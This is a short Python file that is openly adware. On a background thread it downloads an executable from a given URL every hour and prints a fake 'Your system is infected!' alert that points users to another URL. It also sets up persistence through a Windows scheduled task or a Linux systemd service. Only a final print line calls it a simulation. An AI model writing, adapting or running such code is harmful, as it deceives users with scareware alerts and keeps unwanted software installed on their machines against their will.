import os
import platform
import requests
import time
import subprocess
from threading import Thread

def adware_auto_download_execs_fake_alerts(download_url: str, alert_url: str) -> None:
    def download_executable(url):
        response = requests.get(url)
        if response.status_code == 200:
            with open('adware.exe', 'wb') as file:
                file.write(response.content)
            print("Executable downloaded successfully.")
        else:
            print("Failed to download executable.")

    def display_fake_alert(url):
        print(f"Security Alert: Your system is infected! Visit {url} for more information.")

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            service_command = f'schtasks /create /tn {service_name} /tr "C:\\path\\to\\adware.exe" /sc daily'
        elif system == "Linux":
            service_name = "adware"
            service_command = f'echo "[Unit]\nDescription=Adware Service\n[Service]\nExecStart=/path/to/adware\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/{service_name}.service && systemctl enable {service_name}'
        else:
            print("Unsupported operating system.")
            return

        try:
            subprocess.run(service_command, shell=True, check=True)
            print(f"Service {service_name} created successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to create service: {e}")

    def run_adware():
        while True:
            download_executable(download_url)
            display_fake_alert(alert_url)
            time.sleep(3600)  # Run every hour

    adware_thread = Thread(target=run_adware)
    adware_thread.daemon = True
    adware_thread.start()

    create_persistence()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Adware simulation stopped.")

